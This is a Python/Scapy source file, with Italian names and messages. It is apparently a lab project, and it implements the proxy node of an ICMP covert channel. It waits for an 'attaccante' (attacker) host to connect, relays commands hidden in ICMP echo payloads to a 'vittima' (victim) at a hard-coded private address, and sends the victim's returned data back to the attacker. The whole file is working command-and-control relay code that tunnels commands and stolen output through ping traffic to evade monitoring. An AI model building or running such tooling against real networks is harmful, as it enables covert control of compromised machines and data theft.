from scapy.all import IP, ICMP,Raw, sr1, AsyncSniffer
from scapy.all import *
import threading 
import argparse 
import mymethods
import time
import re
import comunication_methods as com
import sys 
import datetime

data_received_event = threading.Event() 
def set_data_received_event():
    data_received_event.set()
def wait_data_received_event():
    data_received_event.wait()
    data_received_event.clear()

attacker_listening = threading.Event() 
def set_attacker_listening():
    attacker_listening.set()
def wait_attacker_listening():
    attacker_listening.wait()
    attacker_listening.clear()

def callback_redirect(packet):
    if packet[IP].src is not ip_attaccante:
        print(f"Il pacchetto non è stato mandato dall'attaccante ma da {packet[IP].src}")
        return
    print(f"Reindirizzamento del pacchetto {packet}") 
    payload=""
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        payload = bytes(packet[Raw].load)
    print(payload) 
    if "__END__" in payload:
        payload=payload.replace("__END__","").strip()
        if payload=="":
            print("Fine connessione")
            com.set_pkt_conn_received()
            return 
    if not packet[ICMP].id==mymethods.calc_checksum(payload):
        print("Il payload non combacia con il checksum")
        print(packet.summary())
        return
    pkt = IP(dst=ip_attaccante)/ICMP(id=packet[ICMP].id, seq=packet[ICMP].seq) / payload
    ans = sr1(pkt, timeout=2, verbose=1)
    if ans:
        print(f"{ip_attaccante} is alive")
        #ans.show() 
    else:
        print(f"No reply: {ip_attaccante} is not responding") 

def parte_redirect_packet():
    sniffer= AsyncSniffer(
        filter=f"icmp and src host {ip_attaccante}" 
        #,count=1 
        ,prn=callback_redirect 
        # #,store=True 
        # #,iface=args.host_iface 
    ) 
    sniffer.start()
    com.wait_pkt_conn_received()
    com.sniffer.stop()
    com.sniffer.join() 

#--Parte 4--#
def callback_aggiorna_attaccante(packet):  
    print("Packet received: {}".format(packet.summary())) 
    print("callback_aggiorna_attaccante")
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):  
        print("aaaa") 
        if packet[ICMP].type!=8 and packet[ICMP].type!=0:
            print(f"Il messaggio non è una Request o Reply: {packet[ICMP].type}")
            return 
        check_sum=mymethods.calc_checksum(com.CONFIRM_PROXY.encode())
        print(packet.show())
        payload=packet[Raw].load
        print(f"Confirm_ProxY in payload: {com.CONFIRM_PROXY.encode() in payload}")
        if packet[IP].src==ip_attaccante and packet[ICMP].id==check_sum: #check_sum==payload and 
            print(f"Payload: {payload}") 
            print("Vittima IPs: {}".format(ip_vittima)) 
            com.set_pkt_conn_received() 
            return
    print(f"Il paccheto proviene da {packet[IP].src} ma non è valido") 

def aggiorna_attaccante(): 
    data=com.CONFIRM_VICTIM.encode()
    if com.send_packet(data,ip_attaccante):
        checksum=mymethods.calc_checksum(com.CONFIRM_PROXY.encode())
        args={
            "filter":f"icmp and src {ip_attaccante} and icmp[4:2]={checksum}" 
            #,"count":1 
            ,"prn":callback_aggiorna_attaccante 
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(ip_attaccante)[1]
        }
        com.sniff_packet(args,5) 
        com.wait_pkt_conn_received() 
        if com.sniffer.running:
            com.sniffer.stop() 
        if com.timeout_timer.is_alive(): 
            com.timeout_timer.cancel()
            print(f"Connessione con {ip_attaccante} stabilita")
            return True 
    print(f"Connessione con {ip_attaccante} impossibile")
    return False 

#--Parte 3--#
def callback_conn_to_vittima(packet): 
    global ip_vittima
    global is_vittima_connected
    print("Packet received: {}".format(packet.summary())) 
    if not is_vittima_connected and packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
        if packet[ICMP].type!=8 and packet[ICMP].type!=0:
            print(f"Il messaggio non è una Request o Reply: {packet[ICMP].type}")
            return 
        check_sum=mymethods.calc_checksum(com.CONFIRM_PROXY.encode())
        print(packet.show())
        payload=packet[Raw].load 
        if packet[IP].src==ip_vittima and packet[ICMP].id==check_sum: #check_sum==payload and 
            print(f"Payload: {payload}") 
            print("Vittima IPs: {}".format(ip_vittima))  
            is_vittima_connected=True 
            com.set_pkt_conn_received() 
            return
    print(f"Il paccheto proviene da {packet[IP].src} ma non è valido")  

def conn_to_vittima():
    global is_vittima_connected
    is_vittima_connected=False
    data=com.CONNECT.encode()
    if com.send_packet(data, ip_vittima): 
        checksum=mymethods.calc_checksum(com.CONFIRM_PROXY.encode())
        args={
            "filter":f"icmp and src {ip_vittima} and icmp[4:2]={checksum}" 
            #,"count":1 
            ,"prn":callback_conn_to_vittima 
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(ip_vittima)[1]
        } 
        com.sniff_packet(args) 
        com.wait_pkt_conn_received() 
        if com.sniffer.running:
            com.sniffer.stop() 
        if com.timeout_timer.is_alive(): 
            com.timeout_timer.cancel()
            is_vittima_connected=True
            print(f"Connessione con {ip_vittima} stabilita")
            return True 
        print(f"Connessione con {ip_vittima} impossibile")
        return False
    print(f"{ip_vittima} is not responding: No Reply")
    return False 

#--Parte 2--#
def callback_conn_from_attaccante(packet): 
    global is_attaccante_connected
    print("Packet received: {}".format(packet.summary())) 
    if not is_attaccante_connected and packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        payload = packet[Raw].load 
        if com.CONNECT.encode() in payload and ip_attaccante==packet[IP].src:
            print(f"{packet[IP].src} si vuole connettere")
            global ip_vittima, gateway_vittima
            ip_vittima= payload.decode().replace(com.CONNECT,"").strip()
            gateway_vittima=mymethods.calc_gateway(ip_vittima)
            print("Attacker IP: {}".format(ip_attaccante))
            print("Payload: {}".format(payload)) 
            print("Vittima IPs: {}".format(ip_vittima))
            print("Vittima Gateway: {}".format(gateway_vittima))
            is_attaccante_connected=True
            com.set_pkt_conn_received()
        else:
            print(f"Il paccheto proviene da {packet[IP].src} ma non richiede la connessione alla macchina")

def conn_from_attaccante():
    global is_attaccante_connected
    is_attaccante_connected=False
    print(f"Attendo connessione da {ip_attaccante} attraverso {mymethods.iface_from_IPv4(ip_attaccante)[1]}") 
    args={
        "filter":f"icmp and src {ip_attaccante}" 
        #,"count":1 
        ,"prn":callback_conn_from_attaccante 
        #,"store":True 
        ,"iface":mymethods.iface_from_IPv4(ip_attaccante)[1]
    } 
    com.sniff_packet(args, None)
    com.wait_pkt_conn_received() 
    if com.sniffer.running:
        com.sniffer.stop() 
    if com.timeout_timer.is_alive():
        com.timeout_timer.cancel()
        is_attaccante_connected=True
        data=com.CONFIRM_ATTACKER.encode() 
        if com.send_packet(data,ip_attaccante):
            print(f"Connessione stabilita per {ip_attaccante}")
            return True
    print(f"Connessione non disponibile per {ip_attaccante}")
    return False 

#-- Parte 1--#
def get_value_of_parser(args):
    if args is None: 
        raise Exception("Nessun argomento passato")
    global ip_attaccante, gateway_attaccante
    ip_attaccante=args.ip_attaccante 
    gateway_attaccante=mymethods.calc_gateway(ip_attaccante) 
    print(f"IP attaccante:\t{ip_attaccante}")
    print(f"Gateway attaccante:\t{gateway_attaccante}") 

def check_value_in_parser(args):
    if type(args) is not argparse.Namespace or args is None:
        print("Nessun argomento passato") 
        return False
    if args.ip_attaccante is None or type(args.ip_attaccante) is not str or re.match(com.ip_reg_pattern, args.ip_attaccante) is None:
        print("IP attaccante non valido o non specificato")
        mymethods.supported_arguments(parser)
        return False   
    #if args.ip_vittima is None or type(args.ip_vittima) is not str or re.match(com.ip_reg_pattern, args.ip_vittima) is None:
        #print("IP vittima non valido o non specificato")
        #mymethods.supported_arguments(parser)
        #return False
    return True

def get_args_from_parser():
    global parser
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip_host",type=str, help="IP dell'attaccante")
    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
    parser.add_argument("--ip_vittima",type=str, help="IP vittima")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
    return mymethods.check_args(parser)

def def_global_variables():
    pass

#-------------------
def parte_1():
    #1) 
    try:
        def_global_variables()
        args=get_args_from_parser() 
        if not check_value_in_parser(args):
            exit(0)
        get_value_of_parser(args) 
    except Exception as e: 
        print(f"Eccezione args: {e}")
        exit(1)
    #2) 
    try:
        print("\tconn_from_attaccante")
        conn_from_attaccante()
    except Exception as e:
        print(f"Eccezione wait_conn_from_attaccante: {e}")
        exit(1) 
    #3) 
    try: 
        print("\tconn_to_vittima")
        if conn_to_vittima():
            #4) 
            try:
                while not aggiorna_attaccante():
                    print("\taggiorna_attaccante")
                    print(print(datetime.datetime.now()))
                    time.sleep(1)
            except Exception as e:
                print(f"aggiorna_attaccante: {e}")
        else:
            exit(0) 
    except Exception as e:
        print(f"connessione_vittima: {e}")
        exit(1) 

#-- Main --# 
def callback_is_attacker_ready(packet):
    print(f"Packet received:{packet.summary()}")
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        if com.READY.encode() in packet[Raw].load:
            print("L'attaccante è pronto")
            com.set_pkt_conn_received() 

def is_attacker_ready():
    args={
        "filter":f"icmp and src {ip_attaccante}" 
        #,"count":1 
        ,"prn":callback_is_attacker_ready 
        #,"store":True 
        ,"iface":mymethods.iface_from_IPv4(ip_attaccante)[1]
    }
    com.sniff_packet(args)
    com.wait_pkt_conn_received() 
    if com.sniffer.running:
        com.sniffer.stop() 
        com.sniffer.join()
    if com.timeout_timer.is_alive():
        com.timeout_timer.cancel()
        send_data_to_attacker(packet_received)
    return


def send_data_to_attacker(data_to_send:list=None):
    if data_to_send is None:
        raise ValueError("Dati non corretti")
    for data in data_to_send:
        print(f"Sending to attacker {data}")
        print(datetime.datetime.now())
        com.send_packet(data[2],ip_attaccante,icmp_seq=data[1])

def callback_wait_dati_from_victim(packet): 
    global packet_received 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        checksum=mymethods.calc_checksum(packet[Raw].load)
        #print(f"Payload received:\t{packet[Raw].load}")
        #print(f"ICMP ID:\t{packet[ICMP].id}")
        #print(f"Checksum:\t{checksum}")
        if packet[ICMP].id==checksum:
            #packet_received.append(packet)
            packet_received.append([packet[ICMP].id,packet[ICMP].seq,packet[Raw].load])
            if com.LAST_PACKET.encode() in packet[Raw].load:
                com.set_pkt_conn_received() 

def send_command_to_victim(command_to_redirect):
    global packet_received 
    packet_received=[]
    ip_vittima="192.168.56.102"
    print(f"Sendin payload {command_to_redirect} to {ip_vittima}")
    try:
        if com.send_packet(command_to_redirect,ip_vittima):
            args={
                "filter":f"icmp and src {ip_vittima}" 
                #,"count":1 
                ,"prn":callback_wait_dati_from_victim 
                #,"store":True 
                ,"iface":mymethods.iface_from_IPv4(ip_vittima)[1]
            }
            com.sniff_packet(args)
            com.wait_pkt_conn_received() 
            if com.sniffer.running:
                com.sniffer.stop() 
                com.sniffer.join()
            if com.timeout_timer.is_alive():
                com.timeout_timer.cancel()
                print(f"Reply: {ip_vittima} ha risposto")
                return
        print(f"No reply: {ip_vittima} non ha risposto")
    except Exception as e:
        print(f"send_payload_to_victim: {e}")

def callback_command_from_attaccante(packet):
    global command_to_redirect
    global is_received_command
    print(f"Packet received:{packet.summary()}")
    if not is_received_command and packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        command_to_redirect=packet[Raw].load
        checksum=mymethods.calc_checksum(command_to_redirect)
        print(f"Command to redirect:\t{command_to_redirect}")
        print(f"Checksum:\t{checksum}")
        if packet[ICMP].id == checksum:
            print(f"ID ICMP {packet[ICMP].id} e checksum del payload {checksum} combaciano {packet[ICMP].id==checksum}")
            is_received_command=True
            com.set_pkt_conn_received()
        else:
            print(f"ID ICMP {packet[ICMP].id} e checksum del payload {checksum} non combaciano {packet[ICMP].id==checksum}")

def parte_2():
    global ip_attaccante
    ip_attaccante="192.168.56.1"
    global command_to_redirect
    global is_received_command
    is_received_command=False
    print(f"Waiting a command from {ip_attaccante}")
    args={
        "filter":f"icmp and src {ip_attaccante}" 
        #,"count":1 
        ,"prn":callback_command_from_attaccante 
        #,"store":True 
        ,"iface":mymethods.iface_from_IPv4(ip_attaccante)[1]
    }
    com.sniff_packet(args, None)
    com.wait_pkt_conn_received() 
    if com.sniffer.running:
        com.sniffer.stop() 
        com.sniffer.join()
    if com.timeout_timer.is_alive():
        com.timeout_timer.cancel()
        is_received_command=True
        print(f"Command to redirect:\t{command_to_redirect}")
        time.sleep(1)
        print("I slept 1 second")
        send_command_to_victim(command_to_redirect) 
        send_data_to_attacker(packet_received)



if __name__ == "__main__": 
    parte_1()
    exit(0)
    parte_2()
    exit(0)
    try:
        parte_redirect_packet() 
        #thread = threading.Thread(target=sniff_4_start)
        #thread.start() 
    except Exception as e:
        print(f"Eccezzione: {e}")